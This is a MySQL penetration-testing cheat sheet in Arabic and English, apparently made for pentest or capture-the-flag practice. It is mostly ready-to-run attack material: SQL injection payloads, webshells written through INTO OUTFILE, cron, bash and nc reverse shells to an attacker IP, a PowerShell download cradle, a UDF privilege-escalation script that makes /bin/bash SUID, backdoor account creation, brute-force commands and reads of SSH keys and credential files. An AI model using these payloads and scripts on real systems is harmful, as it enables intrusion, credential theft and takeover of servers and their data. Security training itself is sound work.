


# 🟦 MySQL — Full Penetration Testing Cheat Sheet

> **Port:** 3306/tcp  
> **Default DB:** MySQL / MariaDB  
> **Auth:** SQL Auth (root / custom) | No Windows Auth

---

## 📋 جدول المحتويات

1. [الاتصال والوصول](https://claude.ai/chat/18094fdf-a2c9-495c-9995-9941424084dc#1-%D8%A7%D9%84%D8%A7%D8%AA%D8%B5%D8%A7%D9%84-%D9%88%D8%A7%D9%84%D9%88%D8%B5%D9%88%D9%84)
2. [Nmap Enumeration](https://claude.ai/chat/18094fdf-a2c9-495c-9995-9941424084dc#2-nmap-enumeration)
3. [الاستكشاف الأساسي](https://claude.ai/chat/18094fdf-a2c9-495c-9995-9941424084dc#3-%D8%A7%D9%84%D8%A7%D8%B3%D8%AA%D9%83%D8%B4%D8%A7%D9%81-%D8%A7%D9%84%D8%A3%D8%B3%D8%A7%D8%B3%D9%8A)
4. [قواعد البيانات والجداول](https://claude.ai/chat/18094fdf-a2c9-495c-9995-9941424084dc#4-%D9%82%D9%88%D8%A7%D8%B9%D8%AF-%D8%A7%D9%84%D8%A8%D9%8A%D8%A7%D9%86%D8%A7%D8%AA-%D9%88%D8%A7%D9%84%D8%AC%D8%AF%D8%A7%D9%88%D9%84)
5. [المستخدمون والصلاحيات](https://claude.ai/chat/18094fdf-a2c9-495c-9995-9941424084dc#5-%D8%A7%D9%84%D9%85%D8%B3%D8%AA%D8%AE%D8%AF%D9%85%D9%88%D9%86-%D9%88%D8%A7%D9%84%D8%B5%D9%84%D8%A7%D8%AD%D9%8A%D8%A7%D8%AA)
6. [قراءة وكتابة الملفات](https://claude.ai/chat/18094fdf-a2c9-495c-9995-9941424084dc#6-%D9%82%D8%B1%D8%A7%D8%A1%D8%A9-%D9%88%D9%83%D8%AA%D8%A7%D8%A8%D8%A9-%D8%A7%D9%84%D9%85%D9%84%D9%81%D8%A7%D8%AA)
7. [SQL Injection — الاكتشاف والاستغلال](https://claude.ai/chat/18094fdf-a2c9-495c-9995-9941424084dc#7-sql-injection--%D8%A7%D9%84%D8%A7%D9%83%D8%AA%D8%B4%D8%A7%D9%81-%D9%88%D8%A7%D9%84%D8%A7%D8%B3%D8%AA%D8%BA%D9%84%D8%A7%D9%84)
8. [SQL Injection → Shell](https://claude.ai/chat/18094fdf-a2c9-495c-9995-9941424084dc#8-sql-injection--shell)
9. [UDF Privilege Escalation — RCE](https://claude.ai/chat/18094fdf-a2c9-495c-9995-9941424084dc#9-udf-privilege-escalation--rce)
10. [LOAD DATA LOCAL INFILE Abuse](https://claude.ai/chat/18094fdf-a2c9-495c-9995-9941424084dc#10-load-data-local-infile-abuse)
11. [استخراج Credentials من الـ Filesystem](https://claude.ai/chat/18094fdf-a2c9-495c-9995-9941424084dc#11-%D8%A7%D8%B3%D8%AA%D8%AE%D8%B1%D8%A7%D8%AC-credentials-%D9%85%D9%86-%D8%A7%D9%84%D9%80-filesystem)
12. [Brute Force](https://claude.ai/chat/18094fdf-a2c9-495c-9995-9941424084dc#12-brute-force)
13. [Metasploit Modules](https://claude.ai/chat/18094fdf-a2c9-495c-9995-9941424084dc#13-metasploit-modules)
14. [Kill Chain & Decision Flow](https://claude.ai/chat/18094fdf-a2c9-495c-9995-9941424084dc#14-kill-chain--decision-flow)
15. [ملفات الإعداد المهمة](https://claude.ai/chat/18094fdf-a2c9-495c-9995-9941424084dc#15-%D9%85%D9%84%D9%81%D8%A7%D8%AA-%D8%A7%D9%84%D8%A5%D8%B9%D8%AF%D8%A7%D8%AF-%D8%A7%D9%84%D9%85%D9%87%D9%85%D8%A9)
16. [Default Databases & Tables](https://claude.ai/chat/18094fdf-a2c9-495c-9995-9941424084dc#16-default-databases--tables)
17. [أدوات التثبيت](https://claude.ai/chat/18094fdf-a2c9-495c-9995-9941424084dc#17-%D8%A3%D8%AF%D9%88%D8%A7%D8%AA-%D8%A7%D9%84%D8%AA%D8%AB%D8%A8%D9%8A%D8%AA)
18. [Quick Reference](https://claude.ai/chat/18094fdf-a2c9-495c-9995-9941424084dc#18-quick-reference)

---

## 1. الاتصال والوصول

### mysql client (الأساسي)

```bash
# محلي — root بدون كلمة مرور
mysql -u root

# محلي — مع كلمة مرور (سيسأل)
mysql -u root -p

# محلي — مع كلمة مرور مباشرة
mysql -u root -pPassword123

# Remote
mysql -h 192.168.1.10 -P 3306 -u root -p

# Remote — كلمة مرور فارغة (لا فراغ بين -p وكلمة المرور)
mysql -h 192.168.1.10 -P 3306 -u root -e 'SELECT VERSION();' 2>/dev/null

# Remote — مع قاعدة بيانات محددة
mysql -h 192.168.1.10 -u root -pPassword123 -D webapp

# تنفيذ ملف SQL
mysql -u root -pPassword123 < commands.sql

# تنفيذ أمر مباشر
mysql -u root -h 127.0.0.1 -e 'show databases;'

# الحصول على shell من داخل mysql
\! sh
```

### NetExec

```bash
# اختبار credentials
nxc mysql 192.168.1.10 -u root -p Password123

# كلمة مرور فارغة
nxc mysql 192.168.1.10 -u root -p '' --local-auth

# تنفيذ استعلام
nxc mysql 192.168.1.10 -u root -p Password123 -x "SHOW DATABASES;"

# Brute Force
nxc mysql 192.168.1.10 -u root -p /usr/share/wordlists/rockyou.txt
```

---

## 2. Nmap Enumeration

```bash
# Full MySQL scan
nmap -p 3306 -sV \
  --script mysql-audit,mysql-databases,mysql-dump-hashes,\
mysql-empty-password,mysql-enum,mysql-info,\
mysql-query,mysql-users,mysql-variables,\
mysql-vuln-cve2012-2122 \
  192.168.1.10

# أسرع — فقط الأهم
nmap -sV -p 3306 --script mysql-info,mysql-empty-password 192.168.1.10
```

### قراءة نتائج Nmap

|Script|ما يكشفه|الأولوية|
|---|---|---|
|`mysql-empty-password`|root أو أي user بكلمة مرور فارغة|🚨 الأهم|
|`mysql-info`|الإصدار + protocol + capabilities|⭐⭐⭐|
|`mysql-databases`|databases بدون auth (anonymous)|🚨|
|`mysql-users`|قائمة المستخدمين|⭐⭐⭐|
|`mysql-dump-hashes`|password hashes|🚨 crack offline|
|`mysql-vuln-cve2012-2122`|Authentication bypass (قديم)|🚨 bypass auth|
|`mysql-variables`|datadir / plugin_dir / secure_file_priv|⭐⭐⭐|
|`mysql-enum`|معلومات إضافية|⭐⭐|

### متى أوقف ومتى أكمل

|الحالة|القرار|
|---|---|
|`mysql-empty-password` نجح|🚨 استغل فوراً — LOAD_FILE + INTO OUTFILE|
|`mysql-dump-hashes` طلع hashes|🚨 hashcat offline|
|`mysql-vuln-cve2012-2122` نجح|🚨 authentication bypass|
|`mysql-databases` طلع databases|⚠️ anonymous access — أكمل enumeration|
|كل شيء مرفوض|✅ احتاج credentials — جرّب brute force|

---

## 3. الاستكشاف الأساسي

```sql
-- النسخة
SELECT VERSION();
SELECT @@version;

-- المستخدم الحالي
SELECT USER();
SELECT CURRENT_USER();

-- قاعدة البيانات الحالية
SELECT DATABASE();

-- اسم الجهاز
SELECT @@hostname;

-- مسار البيانات
SELECT @@datadir;

-- المنفذ
SELECT @@port;
```

---

## 4. قواعد البيانات والجداول

### قواعد البيانات

```sql
SHOW DATABASES;
SELECT schema_name FROM information_schema.schemata;
SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata;
```

### الجداول

```sql
-- جداول قاعدة البيانات الحالية
SHOW TABLES;
SELECT table_name FROM information_schema.tables WHERE table_schema=database();
SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database();

-- جداول قاعدة بيانات محددة
SELECT table_name FROM information_schema.tables WHERE table_schema='webapp';

-- تبديل قاعدة البيانات
USE webapp;
```

### الأعمدة

```sql
-- أعمدة جدول معين
DESCRIBE users;
SHOW COLUMNS FROM users;
SELECT column_name, data_type FROM information_schema.columns WHERE table_name='users';
SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users';

-- البحث عن أعمدة passwords
SELECT table_name, column_name
FROM information_schema.columns
WHERE column_name LIKE '%pass%'
   OR column_name LIKE '%pwd%'
   OR column_name LIKE '%secret%';
```

### قراءة البيانات

```sql
SELECT * FROM users;
SELECT username, password FROM users;
SELECT COUNT(*) FROM users;
SELECT * FROM users WHERE username='admin';
```

---

## 5. المستخدمون والصلاحيات

### عرض المستخدمين

```sql
-- كل المستخدمين
SELECT User, Host FROM mysql.user;
SELECT user, host, authentication_string FROM mysql.user;

-- معلومات كاملة مع الصلاحيات
SELECT user, password, create_priv, insert_priv, update_priv,
       alter_priv, delete_priv, drop_priv, file_priv, super_priv
FROM mysql.user;
```

### فحص الصلاحيات

```sql
-- صلاحياتي
SHOW GRANTS;
SHOW GRANTS FOR CURRENT_USER();

-- صلاحيات مستخدم محدد
SHOW GRANTS FOR 'root'@'localhost';

-- من عنده FILE privilege
SELECT user, file_priv FROM mysql.user WHERE file_priv='Y';

-- من عنده Super_priv
SELECT user, Super_priv FROM mysql.user WHERE Super_priv='Y';

-- كل الصلاحيات
SELECT * FROM fn_my_permissions(NULL, 'DATABASE');

-- Functions (للكشف عن UDFs)
SELECT routine_name FROM information_schema.routines WHERE routine_type='FUNCTION';
SELECT routine_name FROM information_schema.routines
WHERE routine_type='FUNCTION' AND routine_schema!='sys';
```

### إنشاء مستخدم مميز

```sql
-- مستخدم جديد بكل الصلاحيات
CREATE USER 'backdoor' IDENTIFIED BY 'Password123!';
GRANT SELECT, CREATE, DROP, UPDATE, DELETE, INSERT ON *.* TO 'backdoor'@'%'
  IDENTIFIED BY 'Password123!' WITH GRANT OPTION;
FLUSH PRIVILEGES;

-- تغيير كلمة مرور root
UPDATE mysql.user SET Password=PASSWORD('NewPassword') WHERE User='root';
UPDATE mysql.user SET authentication_string=PASSWORD('NewPassword') WHERE User='root';
FLUSH PRIVILEGES;
```

---

## 6. قراءة وكتابة الملفات

> **المتطلبات:** FILE privilege + secure_file_priv = '' (فارغ)

### فحص secure_file_priv أولاً

```sql
SHOW VARIABLES LIKE 'secure_file_priv';
-- ''   → غير مقيّد ✅ (يمكن قراءة/كتابة أي مسار)
-- NULL → معطّل   ❌
-- /tmp → مقيّد لـ /tmp فقط ⚠️

SHOW VARIABLES LIKE 'datadir';
SHOW VARIABLES LIKE 'plugin_dir';
```

### قراءة الملفات

```sql
-- /etc/passwd
SELECT LOAD_FILE('/etc/passwd');

-- config.php
SELECT LOAD_FILE('/var/www/html/config.php');
SELECT LOAD_FILE('/var/www/html/wp-config.php');
SELECT LOAD_FILE('/var/www/html/configuration.php');

-- SSH key
SELECT LOAD_FILE('/root/.ssh/id_rsa');

-- debian credentials
SELECT LOAD_FILE('/etc/mysql/debian.cnf');

-- MySQL hashes من الـ filesystem
SELECT LOAD_FILE('/var/lib/mysql/mysql/user.MYD');
```

### كتابة الملفات

```sql
-- Webshell بسيط
SELECT '<?php system($_GET["cmd"]); ?>'
INTO OUTFILE '/var/www/html/shell.php';

-- Webshell كامل
SELECT '<?php echo passthru($_GET["cmd"]); ?>'
INTO OUTFILE '/var/www/html/shell.php';

-- SSH authorized_keys
SELECT 'ssh-rsa AAAA...'
INTO OUTFILE '/root/.ssh/authorized_keys';

-- Cron job → Reverse Shell
SELECT "* * * * * root bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'\n"
INTO DUMPFILE '/etc/cron.d/pwned';

-- Webshell من UDF binary
SELECT CONVERT(from_base64('BASE64_OF_SHELL'), BINARY)
INTO DUMPFILE '/var/www/html/shell.php';
```

### نسخ ملف (Windows)

```sql
SELECT LOAD_FILE('C:\\xampp\\htdocs\\ncat.exe')
INTO DUMPFILE 'C:\\xampp\\htdocs\\nc.exe';
```

---

## 7. SQL Injection — الاكتشاف والاستغلال

### الخطوات بالترتيب

```
1️⃣  ORDER BY     → عرفة عدد الأعمدة
2️⃣  UNION NULL   → تأكيد العدد
3️⃣  UNION 'a'   → معرفة أي عمود STRING
4️⃣  database()  → اسم الـ DB
5️⃣  tables      → أسماء الجداول
6️⃣  columns     → أسماء الأعمدة
7️⃣  data dump   → سحب البيانات
```

### 1️⃣ ORDER BY — تحديد عدد الأعمدة

```sql
Gifts' ORDER BY 1-- 
Gifts' ORDER BY 2-- 
Gifts' ORDER BY 3-- 
-- عند الخطأ → عدد الأعمدة = الرقم السابق
```

### 2️⃣ UNION SELECT NULL — تأكيد العدد

```sql
' UNION SELECT NULL-- 
' UNION SELECT NULL,NULL-- 
' UNION SELECT NULL,NULL,NULL-- 
' UNION SELECT NULL,NULL,NULL,NULL-- 
-- عند نجاح 200 → عدد الأعمدة محدد
```

### 3️⃣ معرفة نوع الأعمدة (STRING)

```sql
' UNION SELECT 'a',NULL-- 
' UNION SELECT NULL,'a'-- 
' UNION SELECT NULL,'a',NULL-- 
-- عمود 'a' ظهر في الصفحة → هذا العمود نستخدمه
```

### 4️⃣ معلومات أساسية

```sql
' UNION SELECT NULL,database()-- 
' UNION SELECT NULL,user()-- 
' UNION SELECT NULL,version()-- 
' UNION SELECT NULL,@@version-- 
' UNION SELECT NULL,@@datadir-- 
' UNION SELECT NULL,@@hostname-- 
' UNION SELECT database(),user(),version()-- 
```

### 5️⃣ Enumeration — Tables

```sql
-- أول جدول
' UNION SELECT NULL,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)-- 

-- كل الجداول مرة وحدة
' UNION SELECT NULL,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())-- 

-- كل الـ databases
' UNION SELECT NULL,(SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata)-- 
```

### 6️⃣ Enumeration — Columns

```sql
-- أعمدة جدول users
' UNION SELECT NULL,(SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1)-- 

-- كل الأعمدة
' UNION SELECT NULL,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users')-- 
```

### 7️⃣ Data Extraction

```sql
-- username:password
' UNION SELECT NULL,(SELECT CONCAT(username,':',password) FROM users LIMIT 0,1)-- 

-- كل اليوزرات
' UNION SELECT NULL,(SELECT GROUP_CONCAT(username,':',password SEPARATOR ' | ') FROM users)-- 

-- أي عمودين
' UNION SELECT 1,CONCAT(user(),0x3a,database()),3,4-- 
```

### Authentication Bypass

```sql
' OR 1=1#
' OR 1=1 LIMIT 1#
' OR '1'='1'--
admin'--
admin' #
```

### Error-Based

```sql
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT DATABASE())))#
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT USER())),1)#
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))-- 
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())),1)-- 
' AND (SELECT COUNT(*) FROM mysql.user)#
' AND EXP(~0)#
```

### Boolean Blind

```sql
' AND 1=1-- 
' AND 1=2-- 
' AND (SELECT COUNT(*) FROM users) > 0-- 
' AND ASCII(SUBSTRING((SELECT user()),1,1)) > 64-- 
' AND (SELECT 1 FROM users WHERE username='admin') = 1-- 
' AND EXISTS(SELECT * FROM users WHERE username='admin')-- 
' AND LENGTH((SELECT DATABASE())) > 5-- 
' AND (SELECT SUBSTR(database(),1,1))='a'-- 
```

### Time-Based Blind

```sql
' AND IF(1=1, SLEEP(5), 0)-- 
' AND IF(1=2, SLEEP(5), 0)-- 
' AND SLEEP(5)-- 
' AND BENCHMARK(5000000, MD5('A'))-- 
' AND IF((SELECT LENGTH(DATABASE()))>3,SLEEP(5),0)-- 
' AND IF((SELECT SUBSTR(database(),1,1))='a',SLEEP(5),0)-- 
' OR SLEEP(5)-- 
```

### Stacked Queries (نادر في MySQL)

```sql
'; EXEC xp_cmdshell 'whoami'-- 
'; DROP TABLE users-- 
'; INSERT INTO users (username,password) VALUES ('hacker','pass')-- 
```

---

## 8. SQL Injection → Shell

### UNION INTO OUTFILE → Webshell

```sql
-- بسيط
' UNION SELECT 1,'<?php system($_GET["cmd"]); ?>',3 INTO OUTFILE '/var/www/html/shell.php'-- -

-- في مجلد tmp
' UNION SELECT 1,2,3,4,"<?php system($_GET['cmd']); ?>",6 INTO OUTFILE '/var/www/html/tmp/shell.php'-- -

-- بدون UNION
SELECT "<?php echo passthru($_GET['cmd']); ?>" INTO OUTFILE '/var/www/shell.php'
```

### تشغيل الـ Shell

```bash
# اختبار
curl "http://192.168.1.10/shell.php?cmd=whoami"

# Reverse shell
curl "http://192.168.1.10/shell.php?cmd=bash%20-c%20'bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.5%2F4444%200%3E%261'"

# في المتصفح
http://192.168.1.10/tmp/shell.php?cmd=nc -e /bin/bash 10.10.14.5 4444
```

### SQLi + PowerShell (MSSQL-style)

```sql
test'; EXEC master.dbo.xp_cmdshell 'powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString(''http://10.10.14.5/shell.ps1'')"';--
```

---

## 9. UDF Privilege Escalation — RCE

### المتطلبات (Checklist)

```bash
# 1. MySQL يعمل كـ root
ps aux | grep mysqld
# يجب أن يظهر: root ... mysqld

# 2. معرفة الـ architecture
uname -m
# x86_64 → compile بـ -m64 | i386 → -m32

# 3. plugin_dir
mysql -u root -p -N -e "SHOW VARIABLES LIKE 'plugin_dir';"
# مثال: /usr/lib/mysql/plugin/

# 4. secure_file_priv
mysql -u root -p -N -e "SHOW VARIABLES LIKE 'secure_file_priv';"
# يجب أن يكون فارغاً (غير مقيّد)

# 5. FILE privilege
mysql -u root -p -e "SHOW GRANTS FOR CURRENT_USER;"
# يجب أن يظهر: FILE أو ALL PRIVILEGES
```

|المتطلب|يكفي|
|---|---|
|mysqld كـ root|✅ ضروري|
|root credentials|✅ ضروري|
|FILE privilege|✅ ضروري|
|secure_file_priv فارغ|✅ ضروري|
|معرفة plugin_dir|✅ ضروري|

### الخطوات — Linux

```bash
# على Kali
searchsploit -m 1518
gcc -g -c 1518.c -fPIC -m64
gcc -g -shared -fPIC -m64 -o raptor_udf2.so 1518.o -lc
python3 -m http.server 8080

# على الهدف
wget http://10.10.14.5:8080/raptor_udf2.so -O /tmp/raptor_udf2.so
```

```sql
-- داخل MySQL
USE mysql;
CREATE TABLE npn(line BLOB);
INSERT INTO npn VALUES(LOAD_FILE('/tmp/raptor_udf2.so'));
SHOW VARIABLES LIKE '%plugin%';
-- استبدل المسار بـ plugin_dir الفعلي
SELECT * FROM npn INTO DUMPFILE '/usr/lib/mysql/plugin/raptor_udf2.so';

-- تسجيل الـ UDF
CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so';

-- التحقق
SELECT name FROM mysql.func WHERE name='do_system';

-- SUID على /bin/bash
SELECT do_system('chmod +s /bin/bash');
ls -l /bin/bash
-- يجب أن يظهر: rws

-- الحصول على root shell
/bin/bash -p
```

### الخطوات — Windows

```sql
USE mysql;
CREATE TABLE npn(line blob);
INSERT INTO npn VALUES(LOAD_FILE('C://temp//lib_mysqludf_sys.dll'));
SHOW VARIABLES LIKE '%plugin%';
SELECT * FROM npn INTO DUMPFILE 'C://Windows//System32//lib_mysqludf_sys_32.dll';
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys_32.dll';

-- إضافة مستخدم admin
SELECT sys_exec("net user hacker Password123 /add");
SELECT sys_exec("net localgroup Administrators hacker /add");
```

### سكربت أتمتة UDF (Bash)

```bash
#!/bin/bash
ATTACKER_IP="10.10.14.5"
PORT="8080"
MYSQL_USER="root"
MYSQL_PASS="Password123"
DB="mysql"
TMP_DIR="/tmp"
UDF_NAME="raptor_udf2.so"

# فحص mysqld user
MYSQL_PROC=$(ps aux | grep mysqld | grep -v grep | awk '{print $1}' | head -n1)
[[ "$MYSQL_PROC" != "root" ]] && echo "[-] mysqld NOT running as root" && exit 1

# plugin_dir
PLUGIN_DIR=$(mysql -u $MYSQL_USER -p$MYSQL_PASS -N -e "SHOW VARIABLES LIKE 'plugin_dir';" 2>/dev/null | awk '{print $2}')

# clean
mysql -u $MYSQL_USER -p$MYSQL_PASS $DB -e "DROP FUNCTION IF EXISTS do_system;" 2>/dev/null
mysql -u $MYSQL_USER -p$MYSQL_PASS $DB -e "DROP TABLE IF EXISTS foo;" 2>/dev/null

# plant UDF
mysql -u $MYSQL_USER -p$MYSQL_PASS $DB <<EOF
CREATE TABLE foo(line BLOB);
INSERT INTO foo VALUES(LOAD_FILE('$TMP_DIR/$UDF_NAME'));
SELECT * FROM foo INTO DUMPFILE '$PLUGIN_DIR/$UDF_NAME';
CREATE FUNCTION do_system RETURNS INTEGER SONAME '$UDF_NAME';
SELECT do_system('chmod +s /bin/bash');
EOF

ls -l /bin/bash
/bin/bash -p
```

---

## 10. LOAD DATA LOCAL INFILE Abuse

> **الفكرة:** إذا MySQL client متصل بـ rogue server، الـ server يمكنه يطلب من الـ client يقرأ ملفات محلية

```sql
-- على الـ victim client
LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE test FIELDS TERMINATED BY '\n';
```

```bash
# Rogue MySQL Server على Kali
# https://github.com/allyshka/Rogue-MySql-Server
python3 rogue_mysql_server.py
```

---

## 11. استخراج Credentials من الـ Filesystem

```bash
# debian-sys-maint credentials (plain text)
cat /etc/mysql/debian.cnf

# MySQL password hashes من الـ binary files
grep -oaE "[-_.a-zA-Z0-9]{3,}" /var/lib/mysql/mysql/user.MYD | grep -v "mysql_native_password"

# فحص من يشغّل MySQL
cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v "#" | grep "user"
systemctl status mysql 2>/dev/null | grep -o ".\{0,0\}user.\{0,50\}" | cut -d '=' -f2 | cut -d ' ' -f1

# config files الشائعة
cat /var/www/html/config.php
cat /var/www/html/wp-config.php
cat /var/www/html/configuration.php
cat /var/www/html/settings.php
```

### Crack MySQL Hashes

```bash
# MySQL 4.1+ (الأشيع)
hashcat -m 300 hashes.txt /usr/share/wordlists/rockyou.txt

# MySQL < 4.1
hashcat -m 200 hashes.txt /usr/share/wordlists/rockyou.txt

# bcrypt
hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt

# john
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

---

## 12. Brute Force

```bash
# Hydra
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://192.168.1.10
hydra -L users.txt -P passwords.txt mysql://192.168.1.10

# Medusa
medusa -h 192.168.1.10 -u root -P /usr/share/wordlists/rockyou.txt -M mysql

# NetExec
nxc mysql 192.168.1.10 -u root -p /usr/share/wordlists/rockyou.txt

# Nmap
nmap -p 3306 --script mysql-brute 192.168.1.10
```

### Default Credentials — جرّبها أولاً

|Username|Password|
|---|---|
|root|(empty)|
|root|root|
|root|toor|
|root|password|
|admin|admin|
|mysql|mysql|
|test|test|

---

## 13. Metasploit Modules

```bash
use auxiliary/scanner/mysql/mysql_version
use auxiliary/scanner/mysql/mysql_authbypass_hashdump
use auxiliary/scanner/mysql/mysql_hashdump       # يحتاج credentials
use auxiliary/admin/mysql/mysql_enum              # يحتاج credentials
use auxiliary/scanner/mysql/mysql_schemadump      # يحتاج credentials
use exploit/windows/mysql/mysql_start_up          # Windows — RCE
```

---

## 14. Kill Chain & Decision Flow

```
3306/tcp open
         │
         ▼
    Nmap Scripts
         │
    ┌────┴─────────────────────┐
    │                          │
mysql-empty-password       mysql-dump-hashes
نجح؟                       طلع hashes؟
    │ YES                      │ YES
    ▼                          ▼
root : (empty)           hashcat -m 300
← Access مباشر           crack offline
         │
         ▼
  Login → mysql -h <IP> -u root -p
         │
         ▼
  Enumeration
  SHOW DATABASES → غير افتراضية؟
         │ YES
         ▼
  SHOW TABLES → users / accounts / credentials
         │
         ▼
  SHOW GRANTS
    ┌────┴───────────────┐
    │ FILE privilege     │ بدون FILE
    ▼                    ▼
LOAD_FILE('/etc/passwd')  ابحث عن credentials في الجداول
INTO OUTFILE → webshell
    │
    ▼
  secure_file_priv = '' ؟
    │ YES
    ▼
  Webshell → Reverse Shell
    │
    ▼
  mysqld as root?
    │ YES
    ▼
  UDF PrivEsc → SUID /bin/bash → root
```

### متى أوقف ومتى أكمل

|الحالة|القرار|
|---|---|
|root بكلمة مرور فارغة|🚨 LOAD_FILE + INTO OUTFILE|
|FILE privilege + `secure_file_priv=''`|🚨 اقرأ /etc/passwd + اكتب webshell|
|password hashes طلعت|🚨 crack offline بـ hashcat|
|databases مثل webapp/cms|🚨 اقرأ credentials من الجداول|
|mysqld as root + FILE|🚨 UDF → RCE → root shell|
|ما في credentials|✅ انتقل للخدمة الثانية|
|حصلت credentials من config.php|⚠️ ارجع جرّبها على MySQL|

---

## 15. ملفات الإعداد المهمة

### Linux

```
/etc/mysql/my.cnf
/etc/mysql/mysql.conf.d/mysqld.cnf
/etc/mysql/debian.cnf              ← credentials plain text
/var/lib/mysql/mysql/user.MYD      ← password hashes binary
~/.my.cnf                          ← credentials المستخدم
~/.mysql.history                   ← تاريخ الأوامر
/var/log/mysql/mysql.log           ← log queries
```

### Windows

```
C:\ProgramData\MySQL\MySQL Server X.X\my.ini
C:\Windows\my.ini
C:\xampp\mysql\bin\my.ini
<InstDir>\mysql\data\
```

### Dangerous MySQL Config Options

|الإعداد|القيمة الخطرة|التأثير|
|---|---|---|
|`user`|root|MySQL يعمل كـ root|
|`secure_file_priv`|(empty)|قراءة/كتابة أي ملف|
|`skip-grant-tables`|موجود|تخطي كل authentication|
|`bind-address`|0.0.0.0|يقبل connections من الخارج|

---

## 16. Default Databases & Tables

|Database|الوصف|
|---|---|
|`mysql`|الأهم — users / permissions / hashes|
|`information_schema`|metadata لكل DBs/Tables/Columns|
|`performance_schema`|بيانات الأداء|
|`sys`|views مبسّطة|

### الجداول المهمة في `mysql` DB

|جدول|المحتوى|
|---|---|
|`mysql.user`|usernames + password_hash + privileges|
|`mysql.db`|صلاحيات على مستوى database|
|`mysql.func`|UDFs مسجّلة|
|`mysql.tables_priv`|صلاحيات على مستوى table|

---

## 17. أدوات التثبيت

```bash
# mysql client
sudo apt install -y mysql-client default-mysql-client

# nmap
sudo apt install -y nmap

# NetExec
pip3 install netexec --break-system-packages

# Hydra
sudo apt install -y hydra

# Medusa
sudo apt install -y medusa

# hashcat
sudo apt install -y hashcat

# GCC (لـ UDF compilation)
sudo apt install -y gcc
```

---

## 18. Quick Reference

### أوامر MySQL الأساسية

|الأمر|الوصف|
|---|---|
|`SELECT VERSION();`|نسخة MySQL|
|`SELECT DATABASE();`|قاعدة البيانات الحالية|
|`SELECT USER();`|المستخدم الحالي|
|`SHOW DATABASES;`|كل قواعد البيانات|
|`SHOW TABLES;`|جداول DB الحالية|
|`DESCRIBE table_name;`|هيكل جدول|
|`SHOW GRANTS;`|صلاحياتي|
|`SHOW VARIABLES LIKE 'secure_file_priv';`|هل FILE مفعّل|
|`\! sh`|shell من mysql client|

### SQL Comments

```
#comment          ← MySQL
-- comment        ← MySQL/MSSQL/PostgreSQL
/*comment*/       ← كل قواعد البيانات
```

### String Concatenation

```sql
CONCAT('foo','bar')
GROUP_CONCAT(col1,':',col2)
GROUP_CONCAT(col SEPARATOR ' | ')
```

### ملفات الإخراج — الأولوية

|الملف|المحتوى|الأولوية|
|---|---|---|
|`valid_credentials.txt`|credentials صالحة|⭐⭐⭐|
|`privileges.txt`|GRANTS — FILE/SUPER|⭐⭐⭐|
|`databases.txt`|قائمة الـ databases|⭐⭐⭐|
|`users.txt`|MySQL users + hosts|⭐⭐⭐|
|`variables.txt`|secure_file_priv + datadir + plugin_dir|⭐⭐⭐|
|`nmap_mysql_scripts.txt`|كل nmap scripts|⭐⭐⭐|
|`security_report.txt`|مشاكل أمنية|⭐⭐|

---

## 📚 المصادر

- [HackTricks - MySQL](https://book.hacktricks.xyz/pentesting/pentesting-mysql)
- [PayloadsAllTheThings - MySQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md)
- [MySQL UDF PrivEsc](https://github.com/sqlmapproject/sqlmap/blob/master/data/udf/mysql/linux/64/)
- [Rogue MySQL Server](https://github.com/allyshka/Rogue-MySql-Server)


















